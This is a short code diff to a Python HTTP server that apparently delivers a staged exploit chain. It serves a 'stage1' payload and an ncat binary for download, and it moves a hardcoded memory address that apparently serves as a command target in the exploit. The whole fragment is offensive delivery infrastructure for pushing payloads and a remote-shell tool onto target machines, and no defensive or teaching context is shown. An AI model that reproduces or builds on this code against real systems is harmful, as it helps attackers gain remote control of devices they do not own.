@@ -6,11 +6,15 @@ from os           import path
 from urllib.parse import urlparse
 from typing       import Dict
 
+
+cmd_addr = 0xbeffc0c4+396
+
+
 class HttpHandler(BaseHTTPRequestHandler):
 
     protocol_version = "HTTP/1.1"
     payload  = "leg"
-    cmd_addr = 0xbeffc0c4+396
+    cmd_addr = cmd_addr
     
     def version_string(self) -> str:
         return "circled.server"
@@ -131,6 +135,7 @@ class HttpHandler(BaseHTTPRequestHandler):
             self.write_response(200, "application/octet-stream", self.serve_stage1_payload())
         elif url_components.path == "/stage1/ncat":
             self.write_response(200, "application/octet-stream", self.serve_file("bins/ncat"))
+            HttpHandler.cmd_addr = cmd_addr
         # Not found
         else:
             self.write_response(404, "text/plain", b"Not found.")
